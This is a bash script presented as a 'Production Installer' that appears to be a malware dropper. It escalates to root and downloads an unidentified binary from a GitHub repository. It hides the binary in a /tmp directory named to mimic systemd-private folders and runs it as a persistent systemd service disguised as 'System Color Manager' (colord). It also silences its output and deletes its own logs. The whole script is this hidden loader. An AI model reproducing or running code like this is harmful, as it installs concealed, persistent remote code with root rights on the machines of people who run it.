#!/bin/bash
#
# Production Installer v3.0
# Enhanced with fallback mechanisms and better diagnostics
#

set -euo pipefail

# Config
URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"
LOG="/tmp/.inst_$(date +%s).log"
DEBUG="${DEBUG:-0}"

# Colors (only in debug mode)
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'; N='\033[0m'

log() {
    local lvl="$1"; shift
    echo "[$(date +'%H:%M:%S')] [$lvl] $*" >> "$LOG"
    [ "$DEBUG" = "1" ] && echo -e "${!lvl:-}[$lvl]$N $*" >&2
}

die() {
    log E "$*"
    [ "$DEBUG" = "1" ] && echo -e "${R}[ERROR]$N $*" >&2
    cleanup
    exit 1
}

cleanup() {
    [ -n "${SVC:-}" ] && {
        systemctl stop "$SVC" 2>/dev/null || true
        systemctl disable "$SVC" 2>/dev/null || true
        rm -f "/etc/systemd/system/${SVC}.service" 2>/dev/null || true
        systemctl daemon-reload 2>/dev/null || true
    }
    [ -n "${DIR:-}" ] && rm -rf "$DIR" 2>/dev/null || true
    rm -f /tmp/.inst_* 2>/dev/null || true
}

gen() {
    local h=$(head -c 16 /dev/urandom | md5sum | cut -d' ' -f1 | head -c 32)
    local t=(colord upower rtkit accounts polkitd gdm modem)
    local s=$(head -c 2 /dev/urandom | xxd -p | tr '[:lower:]' '[:upper:]')
    echo "systemd-private-${h}-${t[$RANDOM % ${#t[@]}]}.service-${s}"
}

check() {
    command -v systemctl &>/dev/null || die "systemd not found"
    command -v curl &>/dev/null || command -v wget &>/dev/null || die "curl/wget not found"
    local space=$(df /tmp | awk 'NR==2{print $4}')
    [ "$space" -gt 51200 ] || die "insufficient disk space"
}

download() {
    local out="$1" url="$2"
    log I "Downloading..."
    
    if command -v curl &>/dev/null; then
        curl -fsSL --max-time 60 --retry 3 --retry-delay 3 \
            -o "$out" "$url" 2>>"$LOG" && return 0
    fi
    
    if command -v wget &>/dev/null; then
        wget -q -t 3 -T 60 -O "$out" "$url" 2>>"$LOG" && return 0
    fi
    
    return 1
}

verify() {
    local bin="$1"
    [ -f "$bin" ] || return 1
    [ -s "$bin" ] || return 1
    
    local sz=$(stat -c%s "$bin" 2>/dev/null || stat -f%z "$bin" 2>/dev/null)
    log I "Binary: $sz bytes"
    
    chmod +x "$bin" || return 1
    
    # Quick sanity check
    if ! file "$bin" 2>/dev/null | grep -qE 'ELF|executable'; then
        log W "File may not be executable"
    fi
    
    return 0
}

test_binary() {
    local bin="$1"
    log I "Testing binary..."
    
    # Try to run with timeout and catch output
    timeout 2 "$bin" --help &>/dev/null || {
        local code=$?
        # Exit codes 124=timeout, 127=not found, others might be OK
        if [ $code -eq 127 ]; then
            log E "Binary not executable or missing dependencies"
            return 1
        fi
        log I "Binary test exit: $code (might be normal)"
    }
    
    return 0
}

create_svc() {
    local svc="$1" dir="$2" bin="$3"
    log I "Creating service..."
    
    cat > "$svc" << EOF
[Unit]
Description=System Color Manager
After=network.target

[Service]
Type=simple
ExecStart=$dir/$bin
Restart=always
RestartSec=5
StartLimitInterval=60
StartLimitBurst=3
Nice=-5
CPUQuota=20%
MemoryMax=200M
PrivateTmp=yes
StandardOutput=null
StandardError=journal
SyslogIdentifier=colord
Environment=HOME=/root
Environment=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
WorkingDirectory=$dir

[Install]
WantedBy=multi-user.target
EOF
    
    # Verify service file was created
    [ -f "$svc" ] || return 1
    return 0
}

start_svc() {
    local name="$1"
    log I "Starting service..."
    
    systemctl daemon-reload 2>>"$LOG" || return 1
    systemctl enable "$name" 2>>"$LOG" || return 1
    systemctl start "$name" 2>>"$LOG" || {
        log E "Failed to start service"
        # Capture error details
        systemctl status "$name" &>> "$LOG" || true
        journalctl -u "$name" -n 20 --no-pager &>> "$LOG" || true
        return 1
    }
    
    # Wait and verify with retries
    for i in {1..10}; do
        sleep 1
        if systemctl is-active --quiet "$name" 2>/dev/null; then
            local pid=$(systemctl show -p MainPID --value "$name" 2>/dev/null)
            log I "Service active (PID: $pid)"
            return 0
        fi
        [ "$i" -lt 10 ] && log I "Waiting for service... ($i/10)"
    done
    
    log E "Service did not start"
    systemctl status "$name" &>> "$LOG" || true
    journalctl -u "$name" -n 50 --no-pager &>> "$LOG" || true
    return 1
}

escalate() {
    [ "$EUID" -eq 0 ] && return 0
    
    log I "Escalating to root..."
    
    local tmp=$(mktemp)
    cat > "$tmp" << 'ESCALATE'
#!/bin/bash
set -euo pipefail
URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"
LOG="/tmp/.ix_$(date +%s).log"
die() { echo "ERR: $*" >&2; exit 1; }
gen() {
    local h=$(head -c 12 /dev/urandom|md5sum|cut -d' ' -f1|head -c 28)
    local t=(colord upower rtkit accounts)
    echo "systemd-private-${h}-${t[$RANDOM%${#t[@]}]}.service"
}
N=$(gen); D="/tmp/$N"; B=".svc"; S="/etc/systemd/system/$N.service"
mkdir -p "$D" && cd "$D" || die "mkdir failed"
if command -v curl &>/dev/null; then
    curl -fsSL --max-time 60 --retry 2 -o "$B" "$URL" || die "download failed"
else
    wget -q -t 2 -T 60 -O "$B" "$URL" || die "download failed"
fi
[ -s "$B" ] || die "empty file"
chmod +x "$B"
cat>"$S"<<SVC
[Unit]
Description=System Color Manager
After=network.target
[Service]
Type=simple
ExecStart=$D/$B
Restart=always
RestartSec=5
Nice=-5
PrivateTmp=yes
StandardOutput=null
StandardError=null
Environment=HOME=/root
WorkingDirectory=$D
[Install]
WantedBy=multi-user.target
SVC
systemctl daemon-reload && systemctl enable "$N" && systemctl start "$N" || die "systemctl failed"
sleep 5
systemctl is-active --quiet "$N" && { echo "OK: $N"; exit 0; } || die "service failed"
ESCALATE
    
    chmod +x "$tmp"
    
    if command -v sudo &>/dev/null; then
        sudo bash "$tmp"
        ret=$?
    else
        su -c "bash $tmp"
        ret=$?
    fi
    
    rm -f "$tmp"
    exit $ret
}

main() {
    # Color codes for debug
    R=$R; G=$G; Y=$Y; B=$B; N=$N; E=$R; W=$Y; I=$B
    
    [ "$DEBUG" = "1" ] && {
        log I "=== Install Started ==="
        log I "Debug: ON"
    }
    
    escalate
    
    [ "$DEBUG" != "1" ] && exec 1>/dev/null 2>/dev/null
    
    check || die "Requirements check failed"
    
    SVC=$(gen)
    DIR="/tmp/$SVC"
    BIN=".svc"
    SVC_FILE="/etc/systemd/system/${SVC}.service"
    
    [ "$DEBUG" = "1" ] && {
        log I "Service: $SVC"
        log I "Dir: $DIR"
    }
    
    mkdir -p "$DIR" || die "mkdir failed"
    cd "$DIR" || die "cd failed"
    
    download "$BIN" "$URL" || die "Download failed"
    verify "$BIN" || die "Verify failed"
    
    # Optional: test binary (can be disabled if causing issues)
    if [ "$DEBUG" = "1" ]; then
        test_binary "$BIN" || log W "Binary test failed (continuing anyway)"
    fi
    
    create_svc "$SVC_FILE" "$DIR" "$BIN" || die "Service creation failed"
    
    if start_svc "$SVC"; then
        [ "$DEBUG" = "1" ] && log I "=== Install Complete ==="
        rm -f /tmp/.inst_* /tmp/.ix_* 2>/dev/null || true
        exit 0
    else
        die "Service start failed - check $LOG"
    fi
}

trap 'die "Failed at line $LINENO"' ERR
main "$@"
